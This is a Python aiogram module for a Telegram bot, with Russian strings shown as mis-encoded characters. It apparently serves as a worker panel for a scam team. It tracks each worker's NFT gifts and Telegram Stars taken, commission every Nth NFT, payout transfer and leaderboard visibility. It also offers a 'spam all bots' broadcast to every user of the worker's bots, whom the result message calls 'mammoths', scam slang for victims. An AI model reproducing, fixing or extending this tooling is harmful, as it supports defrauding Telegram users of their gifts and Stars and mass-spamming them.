import asyncio
from aiogram import Router, types, F, Bot
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from sqlalchemy import select, func
from db import Session
from models import Admin, WorkerBot, WorkerBotUser
import datetime
from datetime import timezone
from aiogram.client.default import DefaultBotProperties
from sqlalchemy.orm import selectinload
from aiogram.exceptions import TelegramRetryAfter
from loader import bot as main_bot
from asyncio import Semaphore, gather, sleep

router = Router()

class EditNickname(StatesGroup):
    waiting_for_nickname = State()

class SpamAllBotsState(StatesGroup):
    waiting_for_spam_text = State()

async def build_profile_text_and_kb(tg_id: int):
    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == tg_id)
        admin = (await session.execute(stmt)).scalar_one_or_none()
        if not admin:
            return None, None
        count_stmt = select(func.count(WorkerBot.id)).where(WorkerBot.owner_id == admin.id)
        bot_count = (await session.execute(count_stmt)).scalar_one()

    payout_status = "‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–∞ –ø–µ—Ä–µ–¥–∞—á–∞" if admin.worker_added_payout_id_flag else "‚ùå –ü–µ—Ä–µ–¥–∞—á–∞ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞"
    days_in_team = (
        (datetime.datetime.now(datetime.timezone.utc) - admin.created_at).days + 1
        if admin.created_at else "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    )
    top_btn_text = "–°–∫—Ä—ã—Ç—å –≤ —Ç–æ–ø–µ" if not admin.hide_in_top else "–ü–æ–∫–∞–∑—ã–≤–∞—Ç—å –≤ —Ç–æ–ø–µ"
    top_btn_data = "toggle_hide_in_top"
    nickname_display = "–°–∫—Ä—ã—Ç" if admin.hide_in_top else (admin.nickname or 'ü§´')

    text = (
        f"üìç <b>–¢–≤–æ–π –ø—Ä–æ—Ñ–∏–ª—å:</b>\n\n"
        f"üÜî <b>Telegram ID:</b> <code>{admin.telegram_id}</code>\n"
        f"üìù <b>–ò–º—è:</b> <b>{admin.first_name or 'ü§´'}</b>\n"
        f"üîñ <b>–¢–≤–æ–π —Ç—ç–≥:</b> <b>#{nickname_display}</b>\n"
        f"üõ†Ô∏è <b>–°—Ç–∞—Ç—É—Å:</b> <b>{admin.status or '–í–æ—Ä–∫–µ—Ä'}</b>\n"
        f"ü§ñ <b>–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–æ—Ç–æ–≤:</b> <b>{bot_count}</b>\n\n"
        f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∑–∞ —Å–µ–≥–æ–¥–Ω—è:</b>\n"
        f"<blockquote>üéÜ <b>NFT:</b> <b>{admin.daily_gifts_unique}</b>\n"
        f"‚≠ê <b>–ó–≤—ë–∑–¥:</b> <b>{admin.daily_stars_sent}</b></blockquote>\n\n"
        f"üìä <b>–û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n"
        f"<blockquote>üéÜ <b>NFT:</b> <b>{admin.gifts_unique_sent}</b>\n"
        f"‚≠ê <b>–ó–≤—ë–∑–¥:</b> <b>{admin.stars_sent}</b></blockquote>\n\n"
        f"üí∞ <b>–ö–æ–º–∏—Å—Å–∏—è:</b>\n"
        f"‚Ä¢ –¢–≤–æ—è –∫–æ–º–∏—Å—Å–∏—è –∫–∞–∂–¥–∞—è {admin.commission_every}-—è NFT\n\n"
        f"{payout_status}\n\n"
        f"‚è≥ <b>–¢—ã —Å –Ω–∞–º–∏:</b> {days_in_team} {'–¥–µ–Ω—å' if days_in_team == 1 else '–¥–Ω–µ–π'}"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=top_btn_text, callback_data=top_btn_data),
            InlineKeyboardButton(text="–ò–∑–º–µ–Ω–∏—Ç—å —Ç—ç–≥", callback_data="edit_nickname"),
        ],
        [InlineKeyboardButton(text="–†–µ—Ñ–µ—Ä–∞–ª–∫–∞", callback_data="referral")],
        [InlineKeyboardButton(text="–ü—Ä–æ—Å–ø–∞–º–∏—Ç—å –≤—Å–µ—Ö –±–æ—Ç–æ–≤", callback_data="spam_all_bots")],
    ])
    return text, kb

@router.message(F.text == "üíÅüèª‚Äç‚ôÄÔ∏è –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å")
async def profile_handler(message: types.Message):
    if message.chat.type != "private":
        await message.answer("‚õî –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –≤ –ª–∏—á–∫–µ —Å –±–æ—Ç–æ–º.")
        return
    text, kb = await build_profile_text_and_kb(message.from_user.id)
    if text is None:
        await message.answer("–ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@router.callback_query(F.data == "edit_nickname")
async def edit_nickname_start(callback: types.CallbackQuery, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="cancel_edit_nickname")]
    ])
    await callback.message.edit_text(
        "<b>‚úèÔ∏è –û—Ç–ø—Ä–∞–≤—å —Ç—ç–≥:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await state.set_state(EditNickname.waiting_for_nickname)
    await callback.answer()

@router.callback_query(F.data == "cancel_edit_nickname")
async def cancel_edit_nickname(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    text, kb = await build_profile_text_and_kb(callback.from_user.id)
    if text:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await callback.answer()

@router.message(EditNickname.waiting_for_nickname)
async def save_new_nickname(message: types.Message, state: FSMContext):
    new_nick = message.text.strip()
    tg_id = message.from_user.id
    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == tg_id)
        admin = (await session.execute(stmt)).scalar_one_or_none()
        if not admin:
            await message.answer("–ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
            await state.clear()
            return
        admin.nickname = new_nick
        session.add(admin)
        await session.commit()
    await state.clear()
    text, kb = await build_profile_text_and_kb(tg_id)
    if text:
        await message.answer(text, parse_mode="HTML", reply_markup=kb)

@router.callback_query(F.data == "cancel_spam_all_bots")
async def cancel_spam_all_bots(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    text, kb = await build_profile_text_and_kb(callback.from_user.id)
    if text:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await callback.answer()

@router.callback_query(F.data == "spam_all_bots")
async def spam_all_bots_prompt(callback: types.CallbackQuery, state: FSMContext):
    async with Session() as session:
        admin_stmt = select(Admin).where(Admin.telegram_id == callback.from_user.id)
        admin = (await session.execute(admin_stmt)).scalar_one_or_none()
        
        if not admin:
            await callback.answer("–û—à–∏–±–∫–∞ –ø—Ä–æ—Ñ–∏–ª—è.", show_alert=True)
            return

        bots_stmt = select(WorkerBot).where(WorkerBot.owner_id == admin.id)
        bots = (await session.execute(bots_stmt)).scalars().all()

        if not bots:
            await callback.answer("‚ö†Ô∏è –£ –≤–∞—Å –Ω–µ—Ç—É –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–æ—Ç–æ–≤.", show_alert=True)
            return

    await state.set_state(SpamAllBotsState.waiting_for_spam_text)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="cancel_spam_all_bots")]
    ])
    text = (
        "<b>–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤—Å–µ—Ö –≤–∞—à–∏—Ö –±–æ—Ç–æ–≤</b>\n\n"
        "<b>–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª—é–±–æ–µ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞</b>\n"
        "<b>–∫—Ä–æ–º–µ —Ñ–æ—Ç–æ –∏ –¥—Ä—É–≥–∏—Ö –≤–ª–æ–∂–µ–Ω–∏–π.</b>"
    )
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@router.message(SpamAllBotsState.waiting_for_spam_text)
async def handle_spam_all_bots_text(message: types.Message, state: FSMContext):
    tg_id = message.from_user.id
    spam_text = message.html_text
    await state.clear()
    await message.answer("<b>‚úÖ –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—Å—Ç–∏–ª–∞—Å—å, –æ–∂–∏–¥–∞–π—Ç–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É.</b>", parse_mode="HTML")
    asyncio.create_task(run_spam_to_all_bots(tg_id, spam_text))

async def run_spam_to_all_bots(tg_id: int, spam_text: str):
    sem = Semaphore(10)
    total = success = failed = 0

    async with Session() as session:
        stmt = (
            select(Admin)
            .options(selectinload(Admin.worker_bots))
            .where(Admin.telegram_id == tg_id)
        )
        admin = (await session.execute(stmt)).scalar_one_or_none()
        if not admin:
            return

        bots = admin.worker_bots

        for bot in bots:
            result = await session.execute(
                select(WorkerBotUser.telegram_id).where(WorkerBotUser.worker_bot_id == bot.id)
            )
            user_ids = [row[0] for row in result.fetchall()]
            total += len(user_ids)

            bot_client = Bot(token=bot.token, default=DefaultBotProperties(parse_mode="HTML"))

            async def send_one(uid):
                nonlocal success, failed
                async with sem:
                    try:
                        await bot_client.send_message(chat_id=uid, text=spam_text, parse_mode="HTML")
                        success += 1
                    except TelegramRetryAfter as e:
                        await sleep(e.retry_after)
                        return await send_one(uid)
                    except Exception:
                        failed += 1

            for i in range(0, len(user_ids), 20):
                chunk = user_ids[i:i + 20]
                await gather(*(send_one(uid) for uid in chunk))
                await sleep(2)

            await bot_client.session.close()

    result_text = (
        f"<b>üìä –†–∞—Å—Å—ã–ª–∫–∞ –ø–æ –≤—Å–µ–º –±–æ—Ç–∞–º –∑–∞–≤–µ—Ä—à–µ–Ω–∞</b>\n\n"
        f"<b>üë• –í—Å–µ–≥–æ –º–∞–º–æ–Ω—Ç–æ–≤: {total}</b>\n"
        f"<b>‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {success}</b>\n"
        f"<b>‚ùå –ù–µ –¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ: {failed}</b>"
    )
    try:
        await main_bot.send_message(chat_id=tg_id, text=result_text, parse_mode="HTML")
    except Exception:
        pass

@router.callback_query(F.data == "toggle_hide_in_top")
async def toggle_hide_in_top_callback(callback: types.CallbackQuery):
    tg_id = callback.from_user.id
    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == tg_id)
        admin = (await session.execute(stmt)).scalar_one_or_none()
        if not admin:
            await callback.answer("–ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω", show_alert=True)
            return
        admin.hide_in_top = not admin.hide_in_top
        session.add(admin)
        await session.commit()
    text, kb = await build_profile_text_and_kb(tg_id)
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer("–ì–æ—Ç–æ–≤–æ!")